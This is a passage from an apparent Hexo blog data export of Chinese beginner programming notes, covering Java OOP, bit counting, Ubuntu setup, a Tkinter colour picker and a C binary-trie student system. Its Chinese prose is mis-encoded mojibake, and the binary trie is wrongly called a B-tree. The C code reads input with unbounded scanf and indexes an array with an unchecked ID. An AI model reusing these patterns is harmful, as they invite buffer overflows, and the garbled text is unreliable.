Leader(int number, String name, double salary,double allowance) { super(number, name, salary); this.allowance = allowance; } public void getAllowance(){ System.out.println(allowance); } @Override public void work(){ System.out.println(&quot;åŸ¹è®­æ–°å‘˜å·¥&quot;); System.out.println(&quot;è®¾è®¡è¯¾ç¨‹ä½“ç³»&quot;); } public void more(){ System.out.println(&quot;ç›‘ç®¡&quot;); } } 1./*åªè¦æœ‰æŠ½è±¡æ–¹æ³•,å°±æ˜¯æŠ½è±¡ç±»,æŠ½è±¡ç±»ä¸­ä¹Ÿå¯ä»¥å­˜åœ¨å…·ä½“æ–¹æ³•*/ //æŠ½è±¡ç±»(ä¸€æ—¦ä¸€ä¸ªç±»æœ‰æŠ½è±¡æ–¹æ³•,é‚£è¿™ä¸ªç±»å°±æ˜¯æŠ½è±¡ç±») //ä½†æŠ½è±¡ç±»ä¸­ä¹Ÿå¯èƒ½æœ‰å…·ä½“çš„æ–¹æ³• abstract class Employee{ private int number; private String name; private double salary; public Employee(int number,String name,double salary){ this.number = number; this.name = name; this.salary = salary; } //æŠ½è±¡æ–¹æ³• public abstract void work();//æ³¨æ„æŠ½è±¡æ–¹æ³•çš„å†™æ³•,åªæ˜¯å£°æ˜ public void aa(){ System.out.println(&quot; say hello&quot;); } } 2.å­ç±»ç»§æ‰¿æŠ½è±¡ç±»,å¿…é¡»å®ç°æŠ½è±¡çˆ¶ç±»çš„æŠ½è±¡æ–¹æ³•,@Override.é™¤äº†ä»¥ä¸Š,å­ç±»è¿˜å¯ä»¥æœ‰å…¶ç‰¹å®šçš„æ–¹æ³• æŠ½è±¡ç±»å’Œæ™®é€šç±»çš„åŒºåˆ«,æŠ½è±¡ç±»çš„æŠ½è±¡æ–¹æ³•ï¼Œå­ç±»å¿…é¡»å®ç°ã€‚æ¯”å¦‚çˆ¶ç±»æœ‰çš„æ–¹æ³•åœ¨è®¾è®¡æ—¶ï¼Œå¹¶ä¸çŸ¥é“è¯¥æ€ä¹ˆå†™ï¼Œè€Œè¦ç•™ç»™å­ç±»å»å®ç°ï¼Œä½†åˆå¿…é¡»å®ç°ã€‚è¿™æ ·çš„å¼ºåˆ¶æ€§æ˜¯æ™®é€šç±»æ‰€ä¸å…·å¤‡çš„http://www.blogjava.net/wintys/archive/2009/06/15/pattern_template_method.html [ä»¥ä¸Šå†…å®¹æ¥è‡ª](https://q.cnblogs.com/q/48158/)","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"javaå¤šæ€","slug":"javaå¤šæ€","date":"2016-11-21T03:03:23.000Z","updated":"2020-11-14T17:12:00.332Z","comments":true,"path":"2016/11/21/javaå¤šæ€/","link":"","permalink":"http://yoursite.com/2016/11/21/java%E5%A4%9A%E6%80%81/","excerpt":"","text":"å¤šæ€æ€§:å¤šç§è¡Œä¸º å­¦ä¹ äºèŒåæ ‡,ä»¥ä¸‹ä»£ç å…¨éƒ¨è¾¹çœ‹è§†é¢‘è¾¹æ•²,åº”è¯¥ä¸ç®—æŠ„è¢­åˆ«äººçŸ¥è¯†äº§æƒ package ploy; public class AnimalDemo { public static void main(String[] args) { //çˆ¶ç±»çš„å¼•ç”¨å˜é‡å¯ä»¥å¼•ç”¨å…¶å­ç±»çš„å¯¹è±¡ Animal animal1=new Dog(&quot;wangcai&quot;);//å‘ä¸Šè½¬å‹//ä¸Šæ˜¯æŒ‡å­ç±»è½¬æˆçˆ¶ç±»,å¯èƒ½ä¼šä¸¢å¤±æ–¹æ³• animal1.eat(); //animal1.hh()//è¿™å°±æ˜¯ä¸¢å¤±æ–¹æ³•,,æ— æ³•è°ƒç”¨hh() //å‘ä¸Šè½¬å‹é¦–å…ˆæ˜¯å®‰å…¨çš„,å½“å¯èƒ½ä¼šå¯¼è‡´å­ç±»æ–¹æ³•çš„ä¸¢å¤± //çˆ¶ç±»çš„å¼•ç”¨å˜é‡,åªèƒ½è°ƒç”¨çˆ¶ç±»ä¸­æœ‰çš„æ–¹æ³•æˆ–å­ç±»é‡å†™çˆ¶ç±»çš„æ–¹æ³• Animal animal2=new Cat(&quot;zhaocaimiao&quot;); animal2.eat(); /*å¤šæ€å­˜åœ¨çš„ä¸‰ä¸ªå¿…è¦æ¡ä»¶ * 1.éœ€è¦å­˜åœ¨ç»§æ‰¿å’Œå®ç°å…³ç³» * 2.åŒæ ·çš„æ–¹æ³•è°ƒç”¨äºŒæ‰§è¡Œä¸åŒæ“ä½œ,è¿è¡Œä¸åŒä»£ç (é‡å†™æ“ä½œ) * 3.åœ¨è¿è¡Œæ—¶çˆ¶ç±»æˆ–è€…æ¥å£çš„å¼•ç”¨å˜é‡å¯ä»¥å¼•ç”¨å…¶å­ç±»çš„å¯¹è±¡ * */ //å‘ä¸‹è½¬å‹æ˜¯ä¸å®‰å…¨çš„ //1./*Cat cat = (Cat)animal1;*/// java.lang.ClassCastException//ç±»å‹è½¬æ¢é”™è¯¯ /*instanceof * result = object instanceof class * å…¸å‹ä½¿ç”¨åœºåˆ * åœ¨å¯¹å¯¹è±¡åšå‘ä¸‹è½¬å‹ä¹‹å‰,æ²¡æœ‰å…¶ä»–æœ‰å…³å¯¹è±¡ç±»å‹ä¿¡æ¯æ—¶,åŠ¡å¿…ä½¿ç”¨instanceof æ¥åˆ¤æ–­ä¸€ä¸‹,é¿å…æŠ›å‡ºClassCastException * * */ //æ­£ç¡®çš„åšæ³• if(animal1 instanceof Cat){//å¹¶æ²¡æœ‰æ‰§è¡Œ System.out.println(&quot;hello1&quot;); Cat cat=(Cat)animal1; } if(animal2 instanceof Cat){ System.out.println(&quot;hello2&quot;); Cat cat=(Cat)animal2; cat.hh();//æ­¤æ—¶å¯ä»¥æ‰§è¡Œå­ç±»ç‰¹æœ‰çš„æ–¹æ³• } //é™æ€ç»‘å®š:final,static,privateå’Œæ„é€ æ–¹æ³•,åœ¨æ‰§è¡Œå‰å·²ç»ç»‘å®š,è¿™äº›æ–¹æ³•æ˜¯ä¸å¯ä»¥ä¿®æ”¹çš„ //åŠ¨æ€ç»‘å®š:Person p=new Teacher();p.sayHi(); } } class Animal{ private String name; public Animal(String name){ this.name = name; } public void eat(){//è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„æ–¹æ³•,é€šç”¨æ–¹æ³•å®ç°æ²¡æœ‰å¤ªå¤§çš„æ„ä¹‰ } } class Dog extends Animal{ public Dog(String name){ super(name); } public void hh(){ System.out.println(&quot;nihai&quot;); } //å¯¹çˆ¶ç±»çš„æ–¹æ³•çš„é‡å†™ @Override public void eat(){ System.out.println(&quot;å•ƒéª¨å¤´&quot;); } } class Cat extends Animal{ public Cat(String name){ super(name); } public void hh(){ System.out.println(&quot;nihai&quot;); } //å¯¹çˆ¶ç±»çš„æ–¹æ³•çš„é‡å†™ @Override public void eat(){ System.out.println(&quot;åƒé±¼è‚‰&quot;); } } å¯¹ä¸Šé¢çš„è§£é‡Š 1./*å¤šæ€å­˜åœ¨çš„ä¸‰ä¸ªå¿…è¦æ¡ä»¶ * 1.éœ€è¦å­˜åœ¨ç»§æ‰¿å’Œå®ç°å…³ç³» * 2.åŒæ ·çš„æ–¹æ³•è°ƒç”¨äºŒæ‰§è¡Œä¸åŒæ“ä½œ,è¿è¡Œä¸åŒä»£ç (é‡å†™æ“ä½œ) * 3.åœ¨è¿è¡Œæ—¶çˆ¶ç±»æˆ–è€…æ¥å£çš„å¼•ç”¨å˜é‡å¯ä»¥å¼•ç”¨å…¶å­ç±»çš„å¯¹è±¡ * */ 2./*åˆ†ä¸ºå‘ä¸Šå‘ä¸‹è½¬å‹ (1)å‘ä¸Šè½¬å‹:Animal animal1=new Dog(&quot;wangcai&quot;);è¿™æ ·ä¼šä¸¢å¤±å˜é‡å’Œæ–¹æ³•,åªèƒ½ä½¿ç”¨çˆ¶ç±»çš„å·²ç»å­˜åœ¨çš„å˜é‡å’Œè¢«å­ç±»é‡å†™çš„æ–¹æ³•. (2)å‘ä¸‹è½¬å‹:è§£å†³å‘ä¸Šè½¬å‹çš„ç¡®å®š,ä½†æ˜¯ä¸å®‰å…¨çš„ /*Cat cat = (Cat)animal1;*/æ¯”å¦‚è¿™å¥è¯,æ˜æ˜animalæ˜¯dogå‹çš„,è¿™æ ·å¼ºè½¬å°±ä¼šæŠ¥é”™ instanceof * result = object instanceof class * å…¸å‹ä½¿ç”¨åœºåˆ * åœ¨å¯¹å¯¹è±¡åšå‘ä¸‹è½¬å‹ä¹‹å‰,æ²¡æœ‰å…¶ä»–æœ‰å…³å¯¹è±¡ç±»å‹ä¿¡æ¯æ—¶,åŠ¡å¿…ä½¿ç”¨instanceof æ¥åˆ¤æ–­ä¸€ä¸‹,é¿å…æŠ›å‡ºClassCastException * (3)å‘ä¸‹è½¬å‹æ—¶,å¯ä»¥å…·ä½“å®ç°å­ç±»ä¸­ç‰¹æœ‰çš„æ–¹æ³•(çˆ¶ç±»æ²¡æœ‰) //æ­£ç¡®çš„åšæ³• if(animal1 instanceof Cat){//å¹¶æ²¡æœ‰æ‰§è¡Œ System.out.println(&quot;hello1&quot;); Cat cat=(Cat)animal1; } if(animal2 instanceof Cat){ System.out.println(&quot;hello2&quot;); Cat cat=(Cat)animal2; cat.hh();//æ­¤æ—¶å¯ä»¥æ‰§è¡Œå­ç±»ç‰¹æœ‰çš„æ–¹æ³• } x */å…·ä½“å®ä¾‹ è¦æ±‚: å­¦æ ¡è¦å®‰è£…æ‰“å°æœº æ‰“å°æœºæœ‰å¾ˆå¤šç§ public class PrinterDemo { public static void main(String[] args) { // ColorPrinter cp = new ColorPrinter(&quot;huipu&quot;); // School school = new School(); // school.setColorPrinter(cp); // Printer p=new ColorPrinter(&quot;huipu&quot;); School school = new School(); school.setPrinter(p); school.print(&quot;hello,java&quot;); } } //å¼€é—­åŸåˆ™:å¯¹ä¿®æ”¹æ˜¯å°é—­çš„,å¯¹æ‰©å±•æ˜¯å¼€æ”¾çš„ class School{/* private ColorPrinter cp=null; private BlackPrinter bp=null; //å®‰è£…å½©è‰²æ‰“å°æœº public void setColorPrinter(ColorPrinter cp){ this.cp = cp; } //å®‰è£…é»‘ç™½æ‰“å°æœº public void setBlackPrinter(BlackPrinter bp){ this.bp=bp; } //print public void print(String content){ //äº¤ç»™ä¸­å¿ƒæ‰“å°æœºæ‰“å° cp.print(content); }*/ private Printer p=null; //æ‹¿çˆ¶ç±»çš„å¼•ç”¨å˜é‡ä½œä¸ºå‚æ•°,å¥½å¤„å°±æ˜¯å¯ä»¥æ¥å—ä»»ä½•å…¶ä»–å­ç±»çš„å¯¹è±¡ //è¶Šæ˜¯æŠ½è±¡çš„ä¸œè¥¿ä»£è¡¨è¶Šç¨³å®š public void setPrinter(Printer p){ this.p=p; } public void print(String content){ p.print(content); } } class Printer { private String brand; public String getBrand(){ return brand; } public Printer(String brand){ this.brand=brand; } //è®©å­ç±»å»å…·ä½“å®ç° public void print(String content){ } } class ColorPrinter extends Printer{ public ColorPrinter(String brand){ super(brand); } @Override public void print(String content){ System.out.println(getBrand()+&quot;å½©è‰²æ‰“å°:&quot;+content); } } class BlackPrinter extends Printer{ public BlackPrinter(String brand){ super(brand); } @Override public void print(String content){ System.out.println(super.getBrand()+&quot;é»‘ç™½æ‰“å°:&quot;+content); } } class zhenPrinter extends Printer{ public zhenPrinter(String brand){ super(brand); } @Override public void print(String content){ System.out.println(super.getBrand()+&quot;é’ˆå¼æ‰“å°:&quot;+content); } }","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"å¤šæ€","slug":"å¤šæ€","permalink":"http://yoursite.com/tags/%E5%A4%9A%E6%80%81/"}]},{"title":"javaç»§æ‰¿","slug":"javaç»§æ‰¿","date":"2016-11-17T10:41:41.000Z","updated":"2020-11-14T17:12:00.940Z","comments":true,"path":"2016/11/17/javaç»§æ‰¿/","link":"","permalink":"http://yoursite.com/2016/11/17/java%E7%BB%A7%E6%89%BF/","excerpt":"","text":"æœ€è¿‘é‡æ–°å¤ä¹ äº†ç»§æ‰¿,æ¯”ç¬¬ä¸€æ¬¡æœ‰æ›´æ·±çš„äº†è§£,æ¸©æ•…è€ŒçŸ¥æ–°.1.ç»§æ‰¿åŸºæœ¬,super,Override public class TeacherDemo { public static void main(String[] args) { JavaTeacher jteacher=new JavaTeacher(&quot;zhangsan&quot;, &quot;jiaoda&quot;); DBTeacher dteacher=new DBTeacher(&quot;nihao&quot;, &quot;phk&quot;); jteacher.teaching(); dteacher.teaching(); } } class Teacher{ private String name; private String school; public Teacher(String name,String school){ this.name=name; this.school=school; } public void teaching(){ System.out.println(&quot;æˆè¯¾é’±å‡†å¤‡&quot;); } } class JavaTeacher extends Teacher{ public JavaTeacher(String name,String school){ super(name, school); } @Override public void teaching(){//æ­¤æ—¶æ— æ³•è°ƒç”¨çˆ¶ç±»,å¯ä»¥super super.teaching(); System.out.println(&quot;eclipse&quot;); } } class DBTeacher extends Teacher{ public DBTeacher(String name,String school){ super(name, school); } @Override public void teaching(){ super.teaching(); System.out.println(&quot;sql&quot;); } } /*æ­¤å¤„,Teacheræ˜¯çˆ¶ç±»,JavaTeacherå’ŒDBTeacheréƒ½æ˜¯ç»§æ‰¿Teacher, 1.çˆ¶ç±»çš„æœ‰å‚æ„é€ æ–¹æ³•,JavaTeacherå’ŒDBTeacherä»–ä»¬çš„æ„é€ æ–¹æ³•,superçˆ¶ç±»çš„æ„é€ æ–¹æ³•. 2.çˆ¶ç±»ä¸­çš„æ–¹æ³•,å­ç±»å¯ä»¥@Override,é‡å†™,åªæ˜¯ä¸ºäº†è¦†ç›–çˆ¶ç±»çš„æ–¹æ³•,å½“é‡å†™çš„æ—¶å€™,å¿…é¡»è¦ä¿è¯è¿”å›å€¼å’Œå½¢å‚éƒ½ä¸èƒ½æ”¹å˜. 3.åœ¨@Overrideæ–¹æ³•ä¸­,å¦‚æœæƒ³è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•,å¯ä»¥,super.æ–¹æ³• */2.finalå…³é”®å­— public class FinalDemo { public static void main(String[] args) { A a=new A(); a.showNumber1(); final A a2=new A();/*æ­¤æ—¶,finalçš„å«ä¹‰æ˜¯a2æ˜¯æŒ‡å‘è¿™ä¸ªnew A(),è€Œä¸å¯ä»¥å†ä¸‹é¢å†é‡æ–°a2=new A()*/ /*a2=new A();The final local variable a2 cannot be assigned. It must be blank and not using a compound assignment*/ //finalç”¨åœ¨å¼•ç”¨å˜é‡ä¸Š,ä»£è¡¨æ­¤å¼•ç”¨å˜é‡,åªèƒ½å¼•ç”¨ä¸€å¼€å§‹è¯´å¼•ç”¨çš„çš„å¯¹è±¡,ä¸­é€”ä¸èƒ½æ”¹å˜ a2.number2 = 5; a2.showNumber2(); } } /*final */class A{ public final int number1 = 1; public int number2 = 2; public void showNumber1(){ System.out.println(number1); } public final void showNumber2(){//å­ç±»ä¸èƒ½å¯¹çˆ¶ç±»ä¸­çš„finalæ–¹æ³•é‡å†™ System.out.println(number2); } } class B extends A{//å½“å¯¹class A ç”¨finalä¿®é¥°æ—¶,æ— æ³•ç»§æ‰¿ /*public void showNumber2(){ System.out.println(super.number2); }*/ } /* 1.å¯¹çˆ¶ç±»å˜é‡åŠ final:public final int number1 = 1;åˆ™è¿™ä¸ªå˜é‡ä¸å¯ä»¥ä¿®æ”¹ 2.å¯¹æ–¹æ³•åŠ final:public final void showNumber2(){ System.out.println(number2); }//æ— æ³•å­ç±»è¿›è¡Œ@Override 3.å¯¹å¯¹è±¡åŠ final: final class A{}åˆ™Bæ— æ³•ç»§æ‰¿A 4.final A a2=new A();/*first*///åœ¨mainå‡½æ•°ä¸­åŠ è¿™ä¸ª,åˆ™a2åªèƒ½æŒ‡å‘å½“å‰è¿™ä¸ªnew A()è€Œä¸èƒ½å†å†™a2=new A();/*second*/ /*a2=new A();The final local variable a2 cannot be assigned. It must be blank and not using a compound assignment*/ //finalç”¨åœ¨å¼•ç”¨å˜é‡ä¸Š,ä»£è¡¨æ­¤å¼•ç”¨å˜é‡,åªèƒ½å¼•ç”¨ä¸€å¼€å§‹è¯´å¼•ç”¨çš„çš„å¯¹è±¡,ä¸­é€”ä¸èƒ½æ”¹å˜ */3.Objectç±» public class ObjectDemo { public static void main(String[] args) { Student stu=new Student(&quot;jack&quot;, 20); System.out.println(stu.toString()); Student stu2=new Student(&quot;jack&quot;, 20); System.out.println(stu.equals(stu2)); } } class Student{ private String name; private int age; public Student(String name, int age) { this.name = name; this.age = age; } @Override public String toString(){ return &quot;name: &quot;+name+&quot; age:&quot;+age; } @Override public int hashCode() { final int prime = 31; int result = 1; result = prime * result + age; result = prime * result + ((name == null) ? 0 : name.hashCode()); return result; } @Override public boolean equals(Object obj) { if (this == obj) return true; if (obj == null) return false; if (this.getClass() != obj.getClass())//è¿”å›ç±»å‹,æ­¤å¤„è¿”å›çš„æ˜¯student return false; Student other = (Student) obj; if (this.age != other.age) return false; if (this.name == null) { if (other.name != null) return false; } else if (!this.name.equals(other.name)) return false; return true; } } /*æ¯ä¸ªç±»éƒ½é»˜è®¤ç»§æ‰¿Object 1.é‡å†™toString Objectç±»çš„toString() public String toString() { return getClass().getName() + &quot;@&quot; + Integer.toHexString(hashCode()); }//getClass().getName()æ˜¯è¿”å›ç±»å å¯ä»¥é‡å†™toString()æ–¹æ³• @Override public String toString(){ return &quot;name: &quot;+name+&quot; age:&quot;+age; } 2.é‡å†™equalsæ–¹æ³• Object ä¸­equalsæºç  public boolean equals(Object obj) { return (this == obj); } é‡å†™equalsæ–¹æ³• @Override public boolean equals(Object obj) { if (this == obj) return true; if (obj == null) return false; if (this.getClass() != obj.getClass())//è¿”å›ç±»å‹,æ­¤å¤„è¿”å›çš„æ˜¯student return false; Student other = (Student) obj; if (this.age != other.age) return false; if (this.name == null) { if (other.name != null) return false; } else if (!this.name.equals(other.name)) return false; return true; } */å­¦ä¹ è‡ªèŒåæ ‡çš„javaè¯¾ç¨‹","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"},{"name":"ç»§æ‰¿","slug":"ç»§æ‰¿","permalink":"http://yoursite.com/tags/%E7%BB%A7%E6%89%BF/"}]},{"title":"ä½è¿ç®—","slug":"ä½è¿ç®—","date":"2016-11-16T02:16:18.000Z","updated":"2020-11-14T17:12:01.428Z","comments":true,"path":"2016/11/16/ä½è¿ç®—/","link":"","permalink":"http://yoursite.com/2016/11/16/%E4%BD%8D%E8%BF%90%E7%AE%97/","excerpt":"","text":"int func(x) { int countx = 0; while (x) { countx ++; x = x &amp; (x - 1); } return countx; }å‡å®šx = 9999ç­”æ¡ˆæ˜¯8x&amp;(x-1) æ±‚çš„æ˜¯äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•°x|(x+1) æ±‚çš„æ˜¯äºŒè¿›åˆ¶ä¸­0çš„ä¸ªæ•° å…ˆæŠŠ9999æ¢æˆ16è¿›åˆ¶ï¼Œç„¶ååœ¨è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œæ±‚äºŒè¿›åˆ¶ä¸­1ä¸ªä¸ªæ•°ã€‚9999 = ï¼ˆ270Fï¼‰ 16 = ï¼ˆ0010 0111 0000 1111ï¼‰ 2æ€»å…±8ä¸ª1ã€‚ 0010011100001111 &amp; 0010011100001110 = 00100111000011100010011100001110 &amp; 0010011100001101 = 00100111000011000010011100001100 &amp; 0010011100001011 = 00100111000010000010011100001000 &amp; 0010011100000111 = 00100111000000000010011100000000 &amp; 0010011011111111 = 00100110000000000010011000000000 &amp; 0010010111111111 = 00100100000000000010010000000000 &amp; 0010001111111111 = 00100000000000000010000000000000 &amp; 0001111111111111 = 0000000000000000 æºåœ°å€","categories":[],"tags":[{"name":"é¢è¯•é¢˜","slug":"é¢è¯•é¢˜","permalink":"http://yoursite.com/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"Ubuntu æŸ¥çœ‹jdk-apiæ–‡æ¡£","slug":"Ubuntu æŸ¥çœ‹jdk-apiæ–‡æ¡£","date":"2016-11-07T03:10:34.000Z","updated":"2020-11-14T17:12:01.906Z","comments":true,"path":"2016/11/07/Ubuntu æŸ¥çœ‹jdk-apiæ–‡æ¡£/","link":"","permalink":"http://yoursite.com/2016/11/07/Ubuntu%20%E6%9F%A5%E7%9C%8Bjdk-api%E6%96%87%E6%A1%A3/","excerpt":"","text":"å®‰è£…è½¯ä»¶ kchmviewer: sudo apt-get install kchmviewerä¸‹è½½chmæ–‡ä»¶:http://download.csdn.net/detail/yw1530/4841951 ä¸‹è½½åç‚¹å‡»æ–‡ä»¶,æå–åˆ°æ¡Œé¢,å¹¶å°†è¯¥æ–‡ä»¶é‡å‘½åä¸ºjdkapi.chm ç„¶åå³å‡»æ‰“å¼€æ–¹å¼.é€‰æ‹©kchmviewer æ¥è‡ªä¿„ç½—æ–¯çš„çˆ±","categories":[],"tags":[]},{"title":"python Tkiinter è‡ªåˆ¶è°ƒè‰²æ¿","slug":"python Tkiinter è‡ªåˆ¶è°ƒè‰²æ¿","date":"2016-11-05T07:42:53.000Z","updated":"2020-11-14T17:12:02.454Z","comments":true,"path":"2016/11/05/python Tkiinter è‡ªåˆ¶è°ƒè‰²æ¿/","link":"","permalink":"http://yoursite.com/2016/11/05/python%20Tkiinter%20%E8%87%AA%E5%88%B6%E8%B0%83%E8%89%B2%E6%9D%BF/","excerpt":"","text":"import Tkinter as tk window=tk.Tk() def sliderUpdate(something): red=redSlider.get() green=greenSlider.get() blue=blueSlider.get() colour=&quot;#%02X%02X%02X&quot;%(red,green,blue) canvas.config(bg=colour) hexText.delete(0,tk.END) hexText.insert(0,colour) def buttonClick(): colour=hexText.get() canvas.config(bg=colour) redSlider.set(int(colour[1:3],16)) greenSlider.set(int(colour[3:5],16)) blueSlider.set(int(colour[5:7],16)) canvas=tk.Canvas(window) redSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate) greenSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate) blueSlider=tk.Scale(window,from_=0,to=255,command=sliderUpdate) hexText=tk.Entry(window,text=&quot;#000000&quot;) button=tk.Button(window,text=&quot;Click&quot;,command=buttonClick) redSlider.grid(row=1,column=1) greenSlider.grid(row=1,column=2) blueSlider.grid(row=1,column=3) canvas.grid(row=2,column=1,columnspan=3) hexText.grid(row=3,column=1,columnspan=3) button.grid(row=4,column=1,columnspan=3) window.mainloop()æœ¬æ®µç¨‹åºä¸­é‡è¦è¿ç”¨åˆ°å¦‚ä¸‹ 1.Scale.get() ç„¶åcolour=â€#%02X%02X%02Xâ€%(red,green,blue)å°†æ•°å€¼å†™ä¸ºå­—ç¬¦ä¸² 2.redSlider.set(int(colour[1:3],16))è¿™å¥è¯,æ˜¯å°†ä¸€ä¸ª16è¿›åˆ¶å­—ç¬¦ä¸²,è½¬åŒ–ä¸º10è¿›åˆ¶çš„æ•°å­—,ç„¶åé€šè¿‡Scale.set() æ–¹æ³• 3.redSlider.grid(row=1,column=1) gridæ–¹æ³•,æ¥æœ‰ç‚¹åƒhtmlä¸­tableçš„å¸ƒå±€,ä»¥åŠcolumnspanè·¨åˆ— //åˆšåœ¨ä¹¦ä¸Šçœ‹åˆ°ä¸€ä¸ªåˆ¶ä½œé¢œè‰²é€‰æ‹©å™¨,ç„¶åè‡ªå·±åˆæ”¹äº†ä¸€ç‚¹,è‡ªå·±åšä¸œè¥¿,æœ‰ç§ä¸°è¡£è¶³é£Ÿçš„æ„Ÿè§‰","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"Linux(Ubuntu) å®‰è£…Python 2.7 IDLE","slug":"Linux(Ubuntu) å®‰è£…Python 2.7 IDLE","date":"2016-11-05T01:03:52.000Z","updated":"2020-11-14T17:12:02.956Z","comments":true,"path":"2016/11/05/Linux(Ubuntu) å®‰è£…Python 2.7 IDLE/","link":"","permalink":"http://yoursite.com/2016/11/05/Linux(Ubuntu)%20%E5%AE%89%E8%A3%85Python%202.7%20IDLE/","excerpt":"","text":"sudo apt-get update &amp;&amp; sudo apt-get upgradeè¾“å…¥å¯†ç  sudo apt-get install idle-python2.7æ¥è‡ªä¸€ä¸ªæ™´å¤©çš„æ˜ŸæœŸå…­æ—©æ™¨ //è½¬è½½è‡ªã€Šé›¶åŸºç¡€å­¦Python(å›¾æ–‡ç‰ˆ)ã€‹","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"ubuntu","slug":"ubuntu","permalink":"http://yoursite.com/tags/ubuntu/"}]},{"title":"Bæ ‘åˆ›å»ºå­¦ç”Ÿç®¡ç†ç³»ç»Ÿ","slug":"Bæ ‘åˆ›å»ºå­¦ç”Ÿç®¡ç†ç³»ç»Ÿ","date":"2016-10-20T08:45:50.000Z","updated":"2020-11-14T17:12:05.318Z","comments":true,"path":"2016/10/20/Bæ ‘åˆ›å»ºå­¦ç”Ÿç®¡ç†ç³»ç»Ÿ/","link":"","permalink":"http://yoursite.com/2016/10/20/B%E6%A0%91%E5%88%9B%E5%BB%BA%E5%AD%A6%E7%94%9F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"åŠŸèƒ½å¦‚ä¸‹1. æ·»åŠ å­¦ç”Ÿ2. åˆ é™¤å­¦ç”Ÿ3. ä¿®æ”¹å­¦ç”Ÿä¿¡æ¯4. è·å¾—å­¦ç”Ÿä¿¡æ¯5. è·å¾—æ‰€æœ‰å­¦ç”Ÿä¿¡æ¯ Bæ ‘åˆ›å»ºä¼˜åŠ¿ æŸ¥æ‰¾éå¸¸å¿«2.ä»»ä½•ä¸€ä¸ªå­¦ç”Ÿåªéœ€è¦æŸ¥è¯¢å‡ æ­¥ï¼ˆè­¬å¦‚2çš„32æ¬¡æ–¹çš„å­¦ç”Ÿï¼Œæ¯æ¬¡åªéœ€è¦32æ¬¡éå†ï¼‰Bæ ‘ç¼ºç‚¹1.ä¸¥é‡æµªè´¹ç©ºé—´ï¼Œæœ‰ç‚¹ç¬¦åˆåŠ¨æ€è§„åˆ’çš„ï¼š ä»¥ç©ºé—´æ¢æ—¶é—´ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; typedef struct stu{ char name[20]; }stu; typedef struct Node{ struct Node *pre,*L,*R; int id; struct stu *info; }biTree; biTree* init(){ biTree *root=(biTree*)malloc(sizeof(biTree)); root-&gt;pre=NULL; root-&gt;L=NULL; root-&gt;R=NULL; return root; } void binary(int x,int b[]){ int i,j=0,temp,count=0; memset(b,0,32*sizeof(int)); if(x==0){ b[0]=0; } while(x!=0){ b[count]=x%2; x/=2; count++; } i=31; while(j&lt;=i){ temp=b[i];b[i]=b[j];b[j]=temp; i--;j++; } } void creat(biTree *root,int id){ biTree *bt,*pre; int b[32]; bt=root; binary(id,b); for (int i = 0; i &lt; 32; ++i){ if(b[i]==0){ if(bt-&gt;L!=NULL){ bt=bt-&gt;L; }else{ pre=bt; bt=(biTree*)malloc(sizeof(biTree)); pre-&gt;L=bt; bt-&gt;pre=pre; bt-&gt;L=NULL; bt-&gt;R=NULL; } }else if(b[i]==1){ if(bt-&gt;R!=NULL){ bt=bt-&gt;R; }else{ pre=bt; bt=(biTree*)malloc(sizeof(biTree)); pre-&gt;R=bt; bt-&gt;pre=pre; bt-&gt;L=NULL; bt-&gt;R=NULL; } } } bt-&gt;id=id; bt-&gt;info=(stu*)malloc(sizeof(stu)); printf(&quot;\\n\\t\\t\\tplease input the name:&quot;); scanf(&quot;%s&quot;,bt-&gt;info-&gt;name); } biTree* getnode(biTree *root,int id){ int b[32]; biTree *bt=root; binary(id,b); if(bt==NULL){ return NULL; } for (int i = 0; i &lt; 32; ++i){ if(bt==NULL){ return NULL; } if(b[i]==0){ bt=bt-&gt;L; if(bt==NULL){ return NULL; } }else if(b[i]==1){ bt=bt-&gt;R; if(bt==NULL){ return NULL; } } } return bt; } int main(){ biTree *root; biTree *stu,*pre; int code,studentId,i,b[32]; int a[1000]; char name[20]; memset(a,0,sizeof(a)); root=init(); while(1){ printf(&quot;\\n\\t\\t\\t==============student system===============&quot;); printf(&quot;\\n\\t\\t\\t 1.add student&quot;); printf(&quot;\\n\\t\\t\\t 2.del student&quot;); printf(&quot;\\n\\t\\t\\t 3.modify student&quot;); printf(&quot;\\n\\t\\t\\t 4.get student information&quot;); printf(&quot;\\n\\t\\t\\t 5.get all student information&quot;); printf(&quot;\\n\\t\\t\\tplease input the choice:&quot;); scanf(&quot;%d&quot;,&amp;code); switch(code){ case 1: printf(&quot;\\n\\t\\t\\tplease input studentId you want to add:&quot;); scanf(&quot;%d&quot;,&amp;studentId); if(a[studentId]==0){ a[studentId]=1; creat(root,studentId); printf(&quot;\\n\\t\\t\\tadd success&quot;); break; } else if(a[studentId]==1){ printf(&quot;\\n\\t\\t\\tthe student is already exit!&quot;); break; } break; case 2: printf(&quot;\\n\\t\\t\\tplease input the studentId you want del:&quot;); scanf(&quot;%d&quot;,&amp;studentId); binary(studentId,b); stu=getnode(root,studentId); if(stu==NULL){ printf(&quot;\\n\\t\\t\\tthe student don&apos;t exit&quot;); break; } pre=stu-&gt;pre; if(b[31]==0){ pre-&gt;L=NULL; }else{ pre-&gt;R=NULL; } free(stu); a[studentId]=0; 